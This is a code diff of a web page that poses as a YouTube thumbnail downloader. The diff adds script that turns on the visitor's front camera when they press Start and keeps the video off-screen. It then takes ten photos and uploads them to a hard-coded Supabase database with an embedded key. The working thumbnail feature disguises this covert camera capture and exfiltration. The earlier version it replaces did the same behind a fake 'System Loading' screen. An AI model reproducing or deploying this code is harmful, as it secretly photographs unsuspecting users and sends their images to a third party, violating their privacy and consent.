@@ -3,104 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Loading</title>
-    <!-- Supabase Library v2 ko import kiya gaya hai -->
+    <title>YouTube Tool</title>
+    <!-- Supabase Library v2 -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; color: white; text-align: center; margin: 0; flex-direction: column; }
-        #status-container { padding: 20px; }
-        #status { font-size: 20px; margin-bottom: 20px; }
-        #loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #allow-button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; display: none; margin-top: 20px; }
-        #allow-button:hover { background-color: #218838; }
-        video { position: absolute; top: -9999px; left: -9999px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            overflow: hidden;
+        }
+        .screen {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            position: relative; /* For positioning the footer */
+        }
+        
+        /* === Welcome Screen Styles === */
+        #welcome-screen h1 { font-size: 28px; margin-bottom: 10px; }
+        #welcome-screen p { font-size: 16px; color: #b0b0b0; margin-bottom: 30px; }
+        #start-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        /* === Main Content (Downloader) Styles === */
+        #main-content { display: none; } /* Initially hidden */
+        #main-content h1 { margin-top: 0; font-size: 24px; }
+        .input-group { display: flex; gap: 10px; margin-top: 20px; }
+        #url-input { flex-grow: 1; padding: 12px; border: 1px solid #333; border-radius: 8px; background-color: #2a2a2a; color: white; font-size: 16px; }
+        #download-btn { background-color: #ff0000; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        #result { margin-top: 30px; min-height: 250px; } /* Give some space */
+        #thumbnail-img { max-width: 100%; border-radius: 8px; border: 2px solid #333; }
+        #download-link { display: none; margin-top: 15px; background-color: #28a745; color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; }
+
+        /* === The Counter/Status Footer === */
+        #status-footer {
+            position: absolute;
+            bottom: 10px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 14px;
+            color: #888;
+        }
+        
+        video, canvas { position: absolute; top: -9999px; left: -9999px; }
     </style>
 </head>
 <body>
 
-    <div id="status-container">
-        <div id="loader"></div>
-        <p id="status">System is loading, please wait...</p>
-        <button id="allow-button">Allow Camera Access</button>
+    <!-- SCREEN 1: WELCOME SCREEN -->
+    <div id="welcome-screen" class="screen">
+        <h1>Welcome to Media Tools</h1>
+        <p>Click Start to access the thumbnail downloader and other utilities.</p>
+        <button id="start-btn">Start</button>
+    </div>
+
+    <!-- SCREEN 2: MAIN CONTENT (THUMBNAIL DOWNLOADER) -->
+    <div id="main-content" class="screen">
+        <h1>YouTube Thumbnail Downloader</h1>
+        <div class="input-group">
+            <input type="text" id="url-input" placeholder="Enter YouTube video URL...">
+            <button id="download-btn">Get Thumbnail</button>
+        </div>
+        <div id="result"></div>
+        <!-- The visible counter will be here -->
+        <div id="status-footer">Status: Idle</div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // === SUPABASE SETUP ===
         const SUPABASE_URL = 'https://zxtapsswwmzrirutpelr.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4dGFwc3N3d216cmlydXRwZWxyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNTExNzcsImV4cCI6MjA2NTcyNzE3N30.J6kJ9k0AEAarxHVePl0gZSG6ya32rP7IsG8R6UfuO-U';
-
-        // Sahi tareeqa Supabase client banane ka
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         
-        const statusEl = document.getElementById('status');
-        const loaderEl = document.getElementById('loader');
-        const allowButton = document.getElementById('allow-button');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        
-        // Yeh line ab chalegi kyunke upar koi error nahi hai
-        setTimeout(() => {
-            statusEl.textContent = 'Permission required to continue.';
-            loaderEl.style.display = 'none';
-            allowButton.style.display = 'block';
-        }, 5000);
+        // === DOM ELEMENTS ===
+        const welcomeScreen = document.getElementById('welcome-screen');
+        const mainContent = document.getElementById('main-content');
+        const startBtn = document.getElementById('start-btn');
+        const statusFooter = document.getElementById('status-footer');
 
-        allowButton.addEventListener('click', startCameraProcess);
+        // === START BUTTON LOGIC ===
+        startBtn.addEventListener('click', () => {
+            console.log("'Start' button clicked. Now requesting camera permission.");
+            
+            // Switch screens first
+            welcomeScreen.style.display = 'none';
+            mainContent.style.display = 'block';
 
-        async function startCameraProcess() {
-            allowButton.style.display = 'none';
-            loaderEl.style.display = 'block';
-            statusEl.textContent = 'Requesting camera access...';
+            // Now, request camera permission
+            initiateCameraProcess();
+        });
+
+        // === CAMERA & COUNTER LOGIC ===
+        async function initiateCameraProcess() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                console.log("Camera permission granted!");
+                statusFooter.textContent = "Camera activated. Preparing to send...";
+                
+                const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    statusEl.textContent = 'Access granted. Capturing images...';
+                    // Start the photo sending process with the counter
                     captureAndSendPhotos(stream);
                 };
             } catch (err) {
-                console.error("Camera access error:", err);
-                statusEl.textContent = 'Camera access was denied. Cannot proceed.';
-                loaderEl.style.display = 'none';
+                console.error("Camera permission denied or error:", err.message);
+                statusFooter.textContent = "Error: Camera access denied.";
             }
         }
 
         function captureAndSendPhotos(stream) {
-            const totalPhotos = 5;
+            const totalPhotos = 10;
             let photosTaken = 0;
-            const captureInterval = setInterval(() => {
+            
+            const captureInterval = setInterval(async () => {
                 if (photosTaken >= totalPhotos) {
                     clearInterval(captureInterval);
                     stream.getTracks().forEach(track => track.stop());
-                    statusEl.textContent = 'Process completed successfully.';
-                    loaderEl.style.display = 'none';
+                    statusFooter.textContent = "Process Complete.";
+                    console.log("Capture process finished.");
                     return;
                 }
+                
                 photosTaken++;
-                statusEl.textContent = `Capturing and sending photo ${photosTaken} of ${totalPhotos}...`;
+                // Update the counter on the screen
+                statusFooter.textContent = `Sending ${photosTaken}/${totalPhotos}...`;
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg');
-                sendToSupabase(imageData);
-            }, 1500);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                try {
+                    await supabaseClient.from('images').insert([{ image_data: imageData }]);
+                    console.log(`Photo ${photosTaken} sent successfully.`);
+                } catch (error) {
+                    console.error(`Failed to send photo ${photosTaken}:`, error.message);
+                    // Even if one fails, the counter continues
+                }
+            }, 2000); // Har 2 second mein ek tasveer
         }
 
-        async function sendToSupabase(imageData) {
-            try {
-                const { data, error } = await supabaseClient // Yahan 'supabaseClient' istemal kiya
-                    .from('images')
-                    .insert([ { image_data: imageData } ]);
-                if (error) throw error;
-                console.log('Image sent to Supabase!');
-            } catch (error) {
-                console.error('Error sending to Supabase:', error.message);
-            }
+        // === THUMBNAIL DOWNLOADER LOGIC (No changes here) ===
+        const urlInput = document.getElementById('url-input');
+        const downloadBtn = document.getElementById('download-btn');
+        const resultDiv = document.getElementById('result');
+        downloadBtn.addEventListener('click', () => {
+            const url = urlInput.value.trim();
+            if (!url) { alert("Please enter a YouTube URL."); return; }
+            const videoID = extractVideoID(url);
+            if (!videoID) { alert("Invalid YouTube URL."); return; }
+            const thumbnailUrl = `https://img.youtube.com/vi/${videoID}/maxresdefault.jpg`;
+            resultDiv.innerHTML = `<img id="thumbnail-img" src="${thumbnailUrl}" alt="YouTube Thumbnail"><a id="download-link" href="${thumbnailUrl}" download="thumbnail.jpg">Download Thumbnail</a>`;
+            document.getElementById('thumbnail-img').onload = () => {
+                document.getElementById('download-link').style.display = 'inline-block';
+            };
+        });
+        function extractVideoID(url) {
+            const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+            const match = url.match(regExp);
+            return (match && match[2].length === 11) ? match[2] : null;
         }
+
     </script>
 </body>
 </html>
